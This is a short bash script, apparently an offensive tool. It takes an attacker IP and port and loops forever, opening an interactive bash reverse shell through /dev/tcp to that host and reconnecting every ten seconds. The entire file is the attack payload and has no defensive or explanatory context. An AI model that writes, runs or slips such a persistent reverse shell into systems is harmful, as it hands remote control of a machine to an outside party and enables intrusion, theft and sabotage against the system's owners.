#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <attacker_ip> <port>"
    exit 1
fi

ATTACKER_IP="$1"
PORT="$2"

while true; do
    bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1
    sleep 10
done
